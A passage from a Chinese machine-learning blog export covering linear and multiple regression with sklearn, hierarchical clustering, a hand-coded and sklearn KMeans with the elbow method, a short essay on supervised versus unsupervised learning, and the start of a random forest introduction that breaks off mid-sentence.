y_predict.reshape(x1.shape),cmap=cm_light)plt.scatter(X_train[:,0],X_train[:,1],c=y_train,cmap=cm_dark,marker='o',edgecolors='k')plt.xlabel('花萼长度')plt.ylabel('花瓣长度')plt.title('鸢尾花分类')plt.grid(True,ls=':')plt.show()参考通俗易懂–逻辑回归算法讲解(算法+案例)利用plt.pcolormesh绘制分类图逻辑回归本质逻辑回归 logistics regression 公式推导]]></content>
      <categories>
        <category>机器学习</category>
        <category>分类</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>分类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线性回归介绍和Python实现]]></title>
    <url>%2Farchives%2Ffae43975.html</url>
    <content type="text"><![CDATA[一、线性回归介绍线性回归是利用数理统计中回归分析来确定两种或两种以上变量间相互依赖的定量关系的一种统计分析方法。其表达形式为$y=w^{\prime} x+e$，e为误差（服从均值为0的正态分布），数学上e叫截距。当回归分析中只包括一个自变量和一个因变量，且二者的关系可用一条直线近似表示，称为一元线性回归分析。当回归分析中包括两个或两个以上的自变量，且因变量和自变量之间是线性关系，则称为多元线性回归分析。1、回归分析流程线性回归属于回归问题。回归问题的流程如下：给定数据集中每个样本及其正确答案。选择一个模型函数h，这里的h代表hypothesis（假设）。为h找到此数据集的（未必是全局）最优解，即找出最优解下的h的参数。这里给定的数据集是训练集（Training Set）。不能所有数据都拿来训练，要留一部分验证模型的准确率，这部分叫测试集。2、典型的线性回归模型下面是几个典型的线性回归模型：最基本的单变量线性回归：$y=b x + e$多变量线性回归：$\hat{h}=\theta_{0}+\theta_{1} x_{1}+\theta_{2} x_{2}+\cdots+\theta_{n} x_{n}+e$多项式回归（Polynomial Regression）：$\hat{h}=\theta_{0}+\theta_{1} x^{1}+\ldots+\theta_{n-1} x^{n-1}+\theta_{n} x^{n}$我们可以令$x_{2}=x^{2}$，$x_{3}=x^{3}$将其转化为了线性回归模型。最终通用表达式就是：$\hat{h}=\theta^{T}X=\theta_{0}+\theta_{1} x_{1}+\theta_{2} x_{2}+\cdots+\theta_{n} x_{n}+e$二、sklearn实现简单线性回归在进行多元线性回归之间通过简单线性回归来展现线性回归的特性和结果，后面再延伸至多元线性回归。1、包导入这里导入进行线性回归的包，我们利用pandas和numpy对数据进行操作，使用matplotlib进行图像化，使用sklearn进行数据集训练与模型导入。123456import pandas as pdimport numpy as npimport matplotlib.pyplot as pltimport seaborn as snsfrom sklearn.model_selection import train_test_splitfrom sklearn.linear_model import LinearRegression2、数据集创建这里我们创建一个数据集来描述学生学习时间与成绩的关系并且做简单的线性回归。1234567#创建数据集examDict = &#123;'学习时间':[0.50,0.75,1.00,1.25,1.50,1.75,1.75,2.00,2.25,2.50,2.75,3.00,3.25,3.50,4.00,4.25,4.50,4.75,5.00,5.50], '分数':[10,22,13,43,20,22,33,50,62,48,55,75,62,73,81,76,64,82,90,93]&#125;#转换为DataFrame的数据格式examDf = pd.DataFrame(examDict)examDf.head()分数学习时间0100.501220.752131.003431.254201.50从上面的数据可以看到数据的特征值与标签，学生的学习时间就是所需要的特征值，而分数就是通过特征值所反应的标签。3、数据集散点图这里我们利用散点图来简单看下学习时间与成绩的情况。1234567#绘制散点图plt.scatter(examDf['分数'],examDf['学习时间'],color = 'b',label = "Exam Data")#添加图的标签（x轴、y轴）plt.xlabel("Hours")plt.ylabel("Score")#显示图像plt.show()从上图可以看到，分数和时间存在一定的相关性。下面我们看下两个变量因素的相关密切程度。4、相关系数相关系数的公式如下：$$P_{x y}=\frac{\operatorname{cov}(X, Y)}{\sigma_{x} \sigma_{y}}$$我们可以简单的认为：0~0.3 弱相关0.3~0.6 中等程度相关0.6~1 强相关12rDf = examDf.corr()print(rDf)分数学习时间分数1.0000000.923985学习时间0.9239851.000000pandas中的数学统计函数DataFrame.corr()可以反应数据间的相关性关系，可从表值中反应出学习时间与分数之间的相关性为强相关（0.6~1）。5、最小二乘法简单回归方程为：y = a + b*x，而这个最佳拟合线是通过最小二乘法来得到。最小二乘法的几个概念：点误差：点误差 = 实际值 - 预测值误差平方和(Sum of square error)：SSE = Σ（实际值-预测值）^2最小二乘法就是使得误差平方和最小来得到最佳拟合。6、训练集、测试集划分这里使用sklearn中的train_test_split函数来划分训练、测试集。12345678exam_X = examDf['学习时间']exam_Y = examDf['分数']# 原数据集拆分训练集和测试集X_train,X_test,Y_train,Y_test = train_test_split(exam_X,exam_Y,train_size = 0.8,test_size = 0.2)print("原始数据特征:",exam_X.shape,",训练数据特征:",X_train.shape,",测试数据特征:",X_test.shape)print("原始数据标签:",exam_Y.shape,",训练数据标签:",Y_train.shape,",测试数据标签:",Y_test.shape)12原始数据特征: (20,) ,训练数据特征: (16,) ,测试数据特征: (4,)原始数据标签: (20,) ,训练数据标签: (16,) ,测试数据标签: (4,)下面是可视化。12345678910#散点图plt.scatter(X_train, Y_train, color="blue", label="train data")plt.scatter(X_test, Y_test, color="red", label="test data") #添加图标标签plt.legend(loc=2)plt.xlabel("Hours")plt.ylabel("Pass")#显示图像plt.show()注意：由于训练集随机分配，每一次运行的结果（点的分布情况，训练集内的情况，测试集内的情况）不都相同。7、模型训练在创建数据集之后我们需要将训练集放入skleran中的线性回归模型LinearRegression()进行训练，使用函数中的.fit方法进行模型的训练。123456model = LinearRegression()X_train = X_train.values.reshape(-1,1)X_test = X_test.values.reshape(-1,1)model.fit(X_train,Y_train)1LinearRegression(copy_X=True, fit_intercept=True, n_jobs=1, normalize=False)注意：因为model需要二维的数组来进行拟合但是这里只有一个特征所以需要reshape来转换为二维数组。在模型训练完成之后会得到所对应的方程式（线性回归方程式）需要利用函数中的intercept_与coef_来得到。123a = model.intercept_ #截距b = model.coef_ #回归系数print("最佳拟合线：截距",a,",回归系数：",b)1最佳拟合线：截距 6.837689362410515 ,回归系数： [17.11669719]由上述的最佳拟合线的截距和回归系数可以算出其线性回归线方程：y = 7.56 + 16.28*x。8、模型评价接下来需要对模型进行预测并评价。决定系数是反映模型拟合优度的重要的统计量。下面是决定系数的简单介绍。假设一数据集包括y1,...,yn共n个观察值，相对应的模型预测值分别为f1,...,fn。定义残差ei = yi − fi，然后可以推得：平均观察值：$\overline{y}=\frac{1}{n} \sum_{i=1}^{n} y_{i}$总平方和（总波动）：$S S_{\mathrm{tot}}=\sum_{i}\left(y_{i}-\overline{y}\right)^{2}$回归平方和：$S S_{\mathrm{reg}}=\sum_{i}\left(f_{i}-\overline{y}\right)^{2}$残差平方和：$S S_{\mathrm{res}}=\sum_{i}\left(y_{i}-f_{i}\right)^{2}=\sum_{i} e_{i}^{2}$由此，决定系数可定义为$$R^{2} \equiv 1-\frac{S S_{\mathrm{res}}}{S S_{\mathrm{tot}}}$$线性回归（右侧）的效果比起平均值（左侧）越好，决定系数的值就越接近于1。 蓝色正方形表示线性回归的残差的平方，红色正方形数据表示对于平均值的残差的平方。从上述定义可以看出，R2取值在0到1之间，且无单位，其数值大小反映了回归贡献的相对程度，即在因变量Y的总变异中回归关系所能解释的百分比。R2是最常用于评价回归模型优劣程度的指标，R2越大（接近于1），所拟合的回归方程越优。123456789101112131415#训练数据的预测值y_train_pred = model.predict(X_train)#绘制最佳拟合线：标签用的是训练数据的预测值y_train_predplt.plot(X_train, y_train_pred, color='black', linewidth=3, label="best line")#测试数据散点图plt.scatter(X_train, Y_train, color="blue", label="train data")plt.scatter(X_test, Y_test, color='red', label="test data")#添加图标标签plt.legend(loc=2)plt.xlabel("Hours")plt.ylabel("Score")#显示图像plt.show()12score = model.score(X_test,Y_test)print(score)10.8161998892697531三、sklearn实现多元线性回归上面我们了解了线性回归相关的分析流程，接下来对多元线性回归进行分析。1、数据导入下面我们从http://www-bcf.usc.edu/~gareth/ISL/Advertising.csv 来下载数据集Advertising.csv，其数据描述了一个产品的销量与广告媒体的投入之间影响。12345678910111213import pandas as pdimport numpy as npimport matplotlib.pyplot as pltimport seaborn as snsfrom sklearn.model_selection import train_test_splitfrom sklearn.linear_model import LinearRegressionadv_data = pd.read_csv("../Advertising.csv")#清洗不需要的数据new_adv_data = adv_data.iloc[:,1:]print(new_adv_data.head())123456 TV radio newspaper sales0 230.1 37.8 69.2 22.11 44.5 39.3 45.1 10.42 17.2 45.9 69.3 9.33 151.5 41.3 58.5 18.54 180.8 10.8 58.4 12.91print('\nShape:',new_adv_data.shape)1Shape: (200, 4)标签值（sales）：Sales：对应产品的销量特征值（TV，Radio，Newspaper）：TV：对于一个给定市场中单一产品，用于电视上的广告费用（以千为单位）Radio：在广播媒体上投资的广告费用Newspaper：用于报纸媒体的广告费用在这个案例中，通过不同的广告投入，预测产品销量。因为响应变量是一个连续的值，所以这个问题是一个回归问题。数据集一共有200个观测值，每一组观测对应一个市场的情况。接下来我们对数据进行描述性统计，以及寻找缺失值（缺失值对模型的影响较大，如发现缺失值应替换或删除）,且利用箱图来可视化查看数据集，在描述统计之后对数据进行相关性分析，以此来查找数据中特征值与标签值之间的关系。2、数据描述12#数据描述new_adv_data.describe()TVradionewspapersalescount200.000000200.000000200.000000200.000000mean147.04250023.26400030.55400014.022500std85.85423614.84680921.7786215.217457min0.7000000.0000000.3000001.60000025%74.3750009.97500012.75000010.37500050%149.75000022.90000025.75000012.90000075%218.82500036.52500045.10000017.400000max296.40000049.600000114.00000027.0000003、缺失值检验12#缺失值检验new_adv_data[new_adv_data.isnull()==True].count()12345TV 0radio 0newspaper 0sales 0dtype: int644、箱形图12new_adv_data.boxplot()plt.show()5、相关系数1new_adv_data.corr()TVradionewspapersalesTV1.0000000.0548090.0566480.782224radio0.0548091.0000000.3541040.576223newspaper0.0566480.3541041.0000000.228299sales0.7822240.5762230.2282991.000000从corr表中看出，TV特征和销量是有比较强的线性关系的，而Radio和Sales线性关系弱一些但是也是属于强相关的，Newspaper和Sales线性关系更弱。接下来建立散点图来查看数据间的关系，这里使用seaborn的pairplot来绘画3种不同的因素对标签值的影响。123# 通过加入一个参数kind='reg'，seaborn可以添加一条最佳拟合直线和95%的置信带。sns.pairplot(new_adv_data, x_vars=['TV','radio','newspaper'], y_vars='sales', size=7, aspect=0.8,kind = 'reg')plt.show()如上图所示，可以了解到不同的因素对销量的预测线（置信度= 95 %），也可以大致看出不同特征对于标签值的影响。6、建立模型在了解了数据的各种情况后需要对数据集建立模型，建立模型的第一步就是建立训练集与测试集，同样的我们将会使用sklearn中的train_test_split函数来创建。1234X_train,X_test,Y_train,Y_test = train_test_split(new_adv_data.iloc[:,:3],new_adv_data.sales,train_size = 0.8,test_size = 0.2) print("原始数据特征:",new_adv_data.iloc[:,:3].shape,",训练数据特征:",X_train.shape,",测试数据特征:",X_test.shape)print("原始数据标签:",new_adv_data.sales.shape,",训练数据标签:",Y_train.shape,",测试数据标签:",Y_test.shape)12原始数据特征: (200, 3) ,训练数据特征: (160, 3) ,测试数据特征: (40, 3)原始数据标签: (200,) ,训练数据标签: (160,) ,测试数据标签: (40,)建立初步的数据集模型之后将训练集中的特征值与标签值放入LinearRegression()模型中且使用fit函数进行训练,在模型训练完成之后会得到所对应的线性回归方程式的截距intercept_与回归系数coef_。123456model = LinearRegression()model.fit(X_train,Y_train)a = model.intercept_ #截距 b = model.coef_ #回归系数print("最佳拟合线:截距",a,",回归系数：",b)1最佳拟合线:截距 2.7283555357741935 ,回归系数： [ 0.04665892 0.19082797 -0.00099623]这里我们得到的多元线性回归模型的函数为：y = 2.79 + 0.04 * TV + 0.187 * Radio - 0.002 * Newspaper对于给定了Radio和Newspaper的广告投入，如果在TV广告上每多投入1个单位，对应销量将增加0.04711个单位。就是加入其它两个媒体投入固定，在TV广告上每增加1000美元，销量将增加47.11。但是大家注意这里的newspaper的系数居然是负数，所以我们可以考虑不使用newspaper这个特征。7、模型评估接下来对数据集进行预测与模型测评。同样使用predict与score函数来获取所需要的预测值与得分。12score = model.score(X_test,Y_test) print(score)10.9028750733729708下面简单看下这个训练好的模型的预测值，然后和实际值进行可视化对比：12Y_pred = model.predict(X_test)print(Y_pred)1234567[ 5.88658387 19.04199354 19.52640033 17.70822778 10.71716318 5.2030417 24.26646035 12.76256323 9.82255698 18.52225153 21.3759422 7.45340113 4.28180262 19.73124396 20.7434211 20.46565901 8.02140753 21.32827151 15.59515058 8.76729192 18.44116227 10.52302626 13.16705012 15.18864077 9.9417295 15.2734619 12.1230943 10.46509366 11.64698928 13.9265036 15.06236293 6.66457005 12.6079046 18.00988685 17.10350626 9.24127309 11.36598772 18.937225 6.43101507 6.89520345]123456plt.plot(range(len(Y_pred)),Y_pred,'b',label="predict")plt.plot(range(len(Y_test)),Y_test,'r',label="test")#显示图像#添加图标标签plt.legend(loc=2)plt.show()四、参考Python实现多元线性回归决定系数]]></content>
      <categories>
        <category>机器学习</category>
        <category>回归</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>回归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[层次聚类介绍]]></title>
    <url>%2Farchives%2F31ee8a52.html</url>
    <content type="text"><![CDATA[层次聚类(Hierarchical Clustering)是聚类算法的一种，通过计算不同类别数据点间的相似度来创建一棵有层次的嵌套聚类树。在聚类树中，不同类别的原始数据点是树的最低层，树的顶层是一个聚类的根节点。创建聚类树有自下而上合并和自上而下分裂两种方法，本篇文章介绍合并方法。 层次聚类的合并算法层次聚类的合并算法通过计算两类数据点间的相似性，对所有数据点中最为相似的两个数据点进行组合，并反复迭代这一过程。简单的说层次聚类的合并算法是通过计算每一个类别的数据点与所有数据点之间的距离来确定它们之间的相似性，距离越小，相似度越高。并将距离最近的两个数据点或类别进行组合，生成聚类树。欧几里德距离矩阵层次聚类使用欧式距离来计算不同类别数据点间的距离（相似度）。我们在前面的几篇文章中都曾经介绍过欧氏距离的计算方法，本篇文章将通过创建一个欧式距离矩阵来计算和对比不同类别数据点间的距离，并对距离值最小的数据点进行组合。以下是欧式距离的计算公式。$$D=\sqrt{\left(x_{1}-y_{1}\right)^{2}+\left(x_{2}-y_{2}\right)^{2}}$$以下为示例数据，我们通过欧氏距离计算下面A到G的欧式距离矩阵，并通过合并的方法将相似度最高的数据点进行组合，并创建聚类树。数据点位置A16.9B38.5C39.5D80.8E82F34.6G116.1创建欧式距离矩阵的方法很简单，将每个类别的数据点分别与A-G中的每个数据点计算距离值，其中A—&gt;B表示数据点A到数据点B的距离，B—&gt;A则代表数据点B到数据点A的距离。这两个距离值是相同的，因此欧式距离矩阵呈对角线对称（绿色部分和蓝色部分）。其中对角线的0值是数据点与自己的距离值。我们将所有数据点间的距离结果进行对比，选择其中距离最近的两个数据点进行组合，并迭代这一过程。下图显示了欧式矩阵的逻辑和计算方法。数据点之间的距离对于示例中的数据点，我们通过计算获得了下面的欧式距离矩阵。其中数据点B到数据点C的距离在所有的距离值中最小，为1.00。以下为数据点间距离值的计算公式。$$D=\sqrt{(B-C)^{2}}=\sqrt{(38.5-39.5)^{2}}$$经过计算数据点B和数据点C与其他数据点相比有最高的相似度。因此，我们将数据点B和数据点C进行组合。并再次计算其他数据点间的距离。数据点与组合数据点间的距离将数据点B与数据点C进行组合后，重新计算各类别数据点间的距离矩阵。数据点间的距离计算方式与之前的方法一样。这里需要说明的是组合数据点(B,C)与其他数据点间的计算方法。当我们计算(B,C)到A的距离时，需要分别计算B到A和C到A的距离均值。$$D=\frac{\sqrt{(B-A)^{2}}+\sqrt{(C-A)^{2}}}{2}=\frac{21.6+22.6}{2}$$经过计算数据点D到数据点E的距离在所有的距离值中最小，为1.20。这表示在当前的所有数据点中（包含组合数据点），D和E的相似度最高。因此我们将数据点D和数据点E进行组合。并再次计算其他数据点间的距离。后面的工作就是不断的重复计算数据点与数据点，数据点与组合数据点间的距离。这个步骤应该由程序来完成。这里由于数据量较小，我们手工计算并列出每一步的距离计算和数据点组合的结果。这一步中，数据点A和数据点F的距离值在所有距离值中最小，因此我们将A和F进行组合，生成组合数据点（A,F）。到此为止除了数据点G以外，其他的数据点都已经根据距离值（相似度）进行了组合。聚类树的最底层已经完成。下面我们将继续计算组合数据点间的距离，并对相似度最高的组合数据点进行合并。两个组合数据点间的距离计算两个组合数据点间距离的方法有三种，分别为Single Linkage，Complete Linkage和Average Linkage。在开始计算之前，我们先来介绍下这三种计算方法以及各自的优缺点。Single LinkageSingle Linkage的计算方法是将两个组合数据点中距离最近的两个数据点间的距离作为这两个组合数据点的距离。这种方法容易受到极端值的影响。两个很相似的组合数据点可能由于其中的某个极端的数据点距离较近而组合在一起。Complete LinkageComplete Linkage的计算方法与Single Linkage相反，将两个组合数据点中距离最远的两个数据点间的距离作为这两个组合数据点的距离。Complete Linkage的问题也与Single Linkage相反，两个不相似的组合数据点可能由于其中的极端值距离较远而无法组合在一起。Average LinkageAverage Linkage的计算方法是计算两个组合数据点中的每个数据点与其他所有数据点的距离。将所有距离的均值作为两个组合数据点间的距离。这种方法计算量比较大，但结果比前两种方法更合理。我们使用Average Linkage计算组合数据点间的距离。下面是计算组合数据点(A,F)到(B,C)的距离，这里分别计算了(A,F)和(B,C)两两间距离的均值。$$D=\frac{\sqrt{(A-B)^{2}}+\sqrt{(A-C)^{2}}+\sqrt{(F-B)^{2}}+\sqrt{(F-C)^{2}}}{4}$$通过计算及对比不同组合数据点间间的距离。(A,F)到(B,C)的距离在所有组合数据点间最小，为13.25。说明(A,F)到(B,C)相似度最高。因此，将(A,F)到(B,C)组合为(A,F,B,C)。使用与之前相同的方法计算出组合数据点(D,E)和G的距离在目前所有组合数据点中最小。为34.70。将(D,E)和G组合为(D,E,G)。最终，通过计算和合并，我们获得了两个组合数据点(A,F,B,C)和(D,E,G)。这也是聚类树的最顶层的两个数据点。下面，我们按之前的计算步骤来构建聚类树。层次聚类树状图将前面的每一步的计算结果以树状图的形式展现出来就是层次聚类树。最底层是原始A到G的7个数据点。依照7个数据点间的相似度组合为聚类树的第二层(A,F),(B,C),(D,E)和G。以此类推生成完整的层次聚类树状图。以下为简单的示意图。本文转载于：层次聚类算法的原理及实现Hierarchical Clustering]]></content>
      <categories>
        <category>机器学习</category>
        <category>聚类</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>聚类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[KMeans聚类算法介绍]]></title>
    <url>%2Farchives%2F3e3c6c6a.html</url>
    <content type="text"><![CDATA[聚类算法是一种非监督算法，当你拥有大量的无标签数据的时候，最方便的做法就是对这些数据用聚类算法进行分类，打上标签。一、KMeans算法的应用图像分割基因片段分类文章标签归类物种种群分类异常数据检测二、KMeans算法步骤第一步 - 随机选择 K 个点作为点的聚类中心，这表示我们要将数据分为 K 类。第二步 - 遍历所有的点 P, 算出 P 到每个聚类中心的距离，将 P 放到最近的聚类中心的点集中。遍历结束后我们将得到 K 个点集。第三步 - 遍历每一个点集，算出每一个点集的中心位置，将其作为新的聚类中心。第四步 - 重复步骤 2 和步骤 3，直到聚类中心位置不再移动。最后的结果是点和质心之间的均方差达到最小。三、KMeans算法的Python实现下面我们以 k = 3 为例演示这个过程。1、初始化123456import numpy as npimport pandas as pdimport matplotlib.pyplot as pltimport copy%matplotlib inline12345678df = pd.DataFrame(&#123; 'x': [12, 20, 28, 18, 29, 33, 24, 45, 45, 52, 51, 52, 55, 53, 55, 61, 64, 69, 72], 'y': [39, 36, 30, 52, 54, 46, 55, 59, 63, 70, 66, 63, 58, 23, 14, 8, 19, 7, 24]&#125;)np.random.seed(200)k = 3centroids = &#123;i+1: [np.random.randint(0, 80), np.random.randint(0, 80)] for i in range(k)&#125;123456789fig = plt.figure(figsize = (5, 5))plt.scatter(df['x'], df['y'], color = 'k') # 画出所有的（x, y）colmap = &#123;1: 'r', 2: 'g', 3: 'b'&#125;for i in centroids.keys(): plt.scatter(*centroids[i], color = colmap[i]) # 画出3个聚类中心点plt.xlim(0, 80)plt.ylim(0, 80)plt.show()2、分配1234567891011def assignment(df, centroids): # 计算每个点到聚类中心点的距离 for i in centroids.keys(): df["distance_from_&#123;&#125;".format(i)] = (np.sqrt((df['x'] - centroids[i][0])**2 + (df['y'] - centroids[i][1])**2)) # 每个点都计算其离三个中心点的距离，取出最短的那个，归类为它 centroid_distance_cols = ["distance_from_&#123;&#125;".format(i) for i in centroids.keys()] df['closest'] = df.loc[:, centroid_distance_cols].idxmin(axis = 1) df['closest'] = df['closest'].map(lambda x: int(x.lstrip('distance_from_'))) df['color'] = df['closest'].map(lambda x: colmap[x]) return df12df = assignment(df, centroids)df.head()xydistance_from_1distance_from_2distance_from_3closestcolor0123926.92582456.08030056.7274181r1203620.88061348.37354653.1507291r2283014.14213641.76122653.3385411r3185236.87817850.99019544.1021541r4295438.11823740.80441234.0587733b1234567fig = plt.figure(figsize=(5, 5))plt.scatter(df['x'], df['y'], color=df['color'], alpha=0.5, edgecolor='k')for i in centroids.keys(): plt.scatter(*centroids[i], color=colmap[i])plt.xlim(0, 80)plt.ylim(0, 80)plt.show()3、更新12345def update(k): for i in centroids.keys(): centroids[i][0] = np.mean(df[df['closest'] == i]['x']) centroids[i][1] = np.mean(df[df['closest'] == i]['y']) return k12old_centroids = copy.deepcopy(centroids)centroids = update(centroids)1234567891011121314fig = plt.figure(figsize=(5, 5))ax = plt.axes()plt.scatter(df['x'], df['y'], color=df['color'], alpha=0.5, edgecolor='k')for i in centroids.keys(): plt.scatter(*centroids[i], color=colmap[i])plt.xlim(0, 80)plt.ylim(0, 80)for i in old_centroids.keys(): old_x = old_centroids[i][0] old_y = old_centroids[i][1] dx = (centroids[i][0] - old_centroids[i][0]) * 0.75 dy = (centroids[i][1] - old_centroids[i][1]) * 0.75 ax.arrow(old_x, old_y, dx, dy, head_width=2, head_length=3, fc=colmap[i], ec=colmap[i])plt.show()4、重新分配1df = assignment(df, centroids)1234567fig = plt.figure(figsize=(5, 5))plt.scatter(df['x'], df['y'], color=df['color'], alpha=0.5, edgecolor='k')for i in centroids.keys(): plt.scatter(*centroids[i], color=colmap[i])plt.xlim(0, 80)plt.ylim(0, 80)plt.show()可以看到一个红色的点，变成了绿色的；一个蓝色的点变成了红色的。我们更加接近最终目标了。5、继续这个过程现在重复这个过程，直到每一个集群都没有变化为止。123456while True: closest_centroids = df['closest'].copy(deep = True) centroids = update(centroids) df = assignment(df, centroids) if closest_centroids.equals(df['closest']): break1234567fig = plt.figure(figsize=(5, 5))plt.scatter(df['x'], df['y'], color=df['color'], alpha=0.5, edgecolor='k')for i in centroids.keys(): plt.scatter(*centroids[i], color=colmap[i])plt.xlim(0, 80)plt.ylim(0, 80)plt.show()现在得到3个清晰地集群和3个质点在这三个集群的中间。四、KMeans算法的scikit-learn实现123456import numpy as npimport pandas as pdimport matplotlib.pyplot as pltfrom sklearn.cluster import KMeans%matplotlib inline123df = pd.DataFrame(&#123; 'x': [12, 20, 28, 18, 29, 33, 24, 45, 45, 52, 51, 52, 55, 53, 55, 61, 64, 69, 72], 'y': [39, 36, 30, 52, 54, 46, 55, 59, 63, 70, 66, 63, 58, 23, 14, 8, 19, 7, 24]&#125;)12kmeans = KMeans(n_clusters = 3)kmeans.fit(df)1KMeans(algorithm=&apos;auto&apos;, copy_x=True, init=&apos;k-means++&apos;, max_iter=300,n_clusters=3, n_init=10, n_jobs=1, precompute_distances=&apos;auto&apos;,random_state=None, tol=0.0001, verbose=0)12labels = kmeans.predict(df)centroids = kmeans.cluster_centers_12345678910fig = plt.figure(figsize=(5, 5))colors = list(map(lambda x: colmap[x+1], labels)) # colors只是一个迭代子，需要加一个list()来得到结果plt.scatter(df['x'], df['y'], color=colors, alpha=0.5, edgecolor='k')for idx, centroid in enumerate(centroids): plt.scatter(*centroid, color=colmap[idx+1])plt.xlim(0, 80)plt.ylim(0, 80)plt.show()五、手肘法寻找最佳K值以上已经介绍了 KMeans 方法的具体流程，但是我们还面临一个问题，如何确定 K 值。1、手肘法原理手肘法的评价K值好坏的标准是SSE（sum of the squared errors）：$$SSE= \sum_{p\in C_i}|p-m_i|^2$$其中 Ci代表第i个簇，p是簇Ci里的样本点，mi是簇的质心。随着聚类数k的增大，样本划分会更加精细，每个簇的聚合程度会逐渐提高，那么误差平方和SSE自然会逐渐变小。并且，当k小于最佳聚类数时，由于k的增大会大幅增加每个簇的聚合程度，故SSE的下降幅度会很大，而当k到达最佳聚类数时，再增加k所得到的聚合程度回报会迅速变小，所以SSE的下降幅度会骤减，然后随着k值的继续增大而趋于平缓，也就是说SSE和k的关系图是一个手肘的形状，而这个肘部对应的k值就是数据的最佳聚类数。这也是该方法被称为手肘法的原因。2、scikit-learn实现现在我们使用 sklearn 库中的 KMeans 方法来跑一下聚类过程，然后将到聚类中心的平均值变化作图。123456789loss = []point_number = len(df)for i in range(1, 10): kmeans = KMeans(n_clusters=i, max_iter=100).fit(df) loss.append(kmeans.inertia_ / point_number) plt.plot(range(1, 10), loss)plt.show()六、KMeans的优缺点1、优点原理简单实现容易聚类效果中上（依赖K的选择）2、缺点无法确定K的个数 （根据什么指标确定K）对离群点敏感 （容易导致中心点偏移）算法复杂度不易控制 O(NKm)， 迭代次数可能较多 （m可能会比较大）局部最优解而不是全局优 （这个和初始点选谁有关）七、参考文章K-MEANS聚类 的 PYTHON 实现从零开始教你 KMeans 算法]]></content>
      <categories>
        <category>机器学习</category>
        <category>聚类</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>聚类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是无监督学习？]]></title>
    <url>%2Farchives%2F7a4d6d3c.html</url>
    <content type="text"><![CDATA[这个问题可以回答得很简单：是否有监督（supervised），就看输入数据是否有标签（label）。输入数据有标签，则为有监督学习，没标签则为无监督学习。首先看什么是学习（learning）？一个成语就可概括：举一反三。此处以高考为例，高考的题目在上考场前我们未必做过，但在高中三年我们做过很多很多题目，懂解题方法，因此考场上面对陌生问题也可以算出答案。机器学习的思路也类似：我们能不能利用一些训练数据（已经做过的题），使机器能够利用它们（解题方法）分析未知数据（高考的题目）？最简单也最普遍的一类机器学习算法就是分类（classification）。对于分类，输入的训练数据有特征（feature），有标签（label）。所谓的学习，其本质就是找到特征和标签间的关系（mapping）。这样当有特征而无标签的未知数据输入时，我们就可以通过已有的关系得到未知数据标签。在上述的分类过程中，如果所有训练数据都有标签，则为有监督学习（supervised learning）。如果数据没有标签，显然就是无监督学习（unsupervised learning）了，也即聚类（clustering）。目前分类算法的效果还是不错的，但相对来讲，聚类算法就有些惨不忍睹了。确实，无监督学习本身的特点使其难以得到如分类一样近乎完美的结果。这也正如我们在高中做题，答案（标签）是非常重要的，假设两个完全相同的人进入高中，一个正常学习，另一人做的所有题目都没有答案，那么想必第一个人高考会发挥更好，第二个人会发疯。这时各位可能要问，既然分类如此之好，聚类如此之不靠谱，那为何我们还可以容忍聚类的存在？因为在实际应用中，标签的获取常常需要极大的人工工作量，有时甚至非常困难。例如在自然语言处理（NLP）中，Penn Chinese Treebank在2年里只完成了4000句话的标签……这时有人可能会想，难道有监督学习和无监督学习就是非黑即白的关系吗？有没有灰呢？Good idea。灰是存在的。二者的中间带就是半监督学习（semi-supervised learning）。对于半监督学习，其训练数据的一部分是有标签的，另一部分没有标签，而没标签数据的数量常常极大于有标签数据数量（这也是符合现实情况的）。隐藏在半监督学习下的基本规律在于：数据的分布必然不是完全随机的，通过一些有标签数据的局部特征，以及更多没标签数据的整体分布，就可以得到可以接受甚至是非常好的分类结果。（此处大量忽略细节）因此，learning家族的整体构造是这样的：1234567有监督学习（分类，回归）↕半监督学习（分类，回归），transductive learning（分类，回归）↕半监督聚类（有标签数据的标签不是确定的，类似于：肯定不是xxx，很可能是yyy）↕无监督学习（聚类）本文转载于：什么是无监督学习？]]></content>
      <categories>
        <category>机器学习</category>
        <category>无监督学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>无监督学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[随机森林通俗介绍]]></title>
    <url>%2Farchives%2F6096d2cd.html</url>
    <content type="text"><![CDATA[随机森林是用随机的方式建立一个森林，森林里面有很多的决策树组成，随机森林的每一棵决策树之间是没有关联的。在得到森林之后，当有一个新的输入样本进入的时候，就让森林中的每一棵决策树分别进行一下判断，看看这个样本应该属于哪一类（对于分类算法），然后看看哪一类被选择最多，就预测这个样本为那一类。随机森林可以既可以处理属性为离散值的量，比如ID3算法，也可以处理属性为连续值的量，比如C4.5算法。另外，随机森林还可以用来进行无监督学习聚类和异常点检测。一、随机森林构造过程下面是随机森林的构造过程：假如有N个样本，则有放回的随机选择N个样本(每次随机选择一个样本，然后返回继续选择)。这选择好了的N个样本用来训练一个决策树，作为决策树根节点处的样本。当每个样本有M个属性时，在决策树的每个节点需要分裂时，随机从这M个属性中选取出m个属性，满足条件m &lt;&lt; M。然后从这m个属性中采用某种策略（比如说信息增益）来选择1个属性作为该节点的分裂属性。决策树形成过程中每个节点都要按照步骤2来分裂（很容易理解，如果下一次该节点选出来的那一个属性是刚刚其父节点分裂时用过的属性，则该节点已经达到了叶子节点，无须继续分裂了）。一直到不能够再分裂为止。注意整个决策树形成过程中没有进行剪枝。按照步骤1~3建立大量的决策树，这样就构成了随机森林了。二、随机森林的注意点在建立每一棵决策树的过程中，有两点需要注意：采样与完全分裂。1、随机采样首先是两个随机采样的过程，随机森林对输入的数据要进行行、列的采样。对于行采样，采用有放回的方式，也就是在采样得到的样本集合中，可能有重复的样本。假设输入样本为N个，那么采样的样本也为N个。这样使得在训练的时候，每一棵树的输入样本都不是全部的样本，使得相对不容易出现过拟合。对于列采样，从M个属性中，选择m个（m &lt;&lt; 